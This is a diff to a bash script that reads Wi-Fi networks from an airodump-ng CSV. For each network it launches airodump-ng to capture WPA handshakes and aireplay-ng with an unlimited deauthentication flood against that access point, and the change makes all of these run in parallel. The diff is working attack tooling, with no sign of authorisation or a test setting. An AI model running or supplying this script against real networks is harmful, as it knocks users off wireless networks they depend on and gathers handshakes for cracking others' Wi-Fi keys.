@@ -54,12 +54,13 @@ function recuperaredes() {
             cryplist+=($cryp)
             keylist+=($key)
 
-            beacon "$(declare -p maclist)" "$(declare -p chanlist)" "$(declare -p cryplist)" "$(declare -p keylist)" & beacon_pid=$!
-            wait $beacon_pid
 
         fi
         numline=$((numline-1))
     done < redes/redes-01.csv
+    
+    beacon "$(declare -p maclist)" "$(declare -p chanlist)" "$(declare -p cryplist)" "$(declare -p keylist)" & beacon_pid=$! 
+    wait $beacon_pid
 }
 
 function beacon() {
@@ -70,16 +71,27 @@ function beacon() {
     eval "$(echo "$4")"
 
     for ((i=0; i<${#maclist[@]}; i++)); do
+        (
+            xterm -T "dump" -e sudo airodump-ng -w caps/${keylist[$i]} -c ${chanlist[$i]} --bssid ${maclist[$i]} wlan0 &
+            #sleep 3  # Adjust this sleep time as needed
+        ) &
+        
+        (
+            #sleep 1  # Sleep for a bit before starting aireplay
+            xterm -T "play" -e sudo aireplay-ng --deauth 0 -a ${maclist[$i]} wlan0 &
+        ) &
 
-        xterm -e sudo airodump-ng -w caps/${keylist[$i]} -c ${chanlist[$i]} --bssid ${maclist[$i]} wlan0 & airodump_pid=$! &
-        sleep .1
-        xterm -e sudo aireplay-ng --deauth 0 -a ${maclist[$i]} wlan0 & aireplay_pid=$!
-        sleep 10
-        kill $airodump_pid
-        kill $aireplay_pid
-        echo deauthing ${maclist[$i]}
+        sleep 3  # Adjust this sleep time as needed
     done
+
+    # Wait for all background processes to finish
+    wait
 }
 
-wlan0monitor
+
+#function deauth(){
+#    local mac=$1
+#}
+
+recuperaredes
 
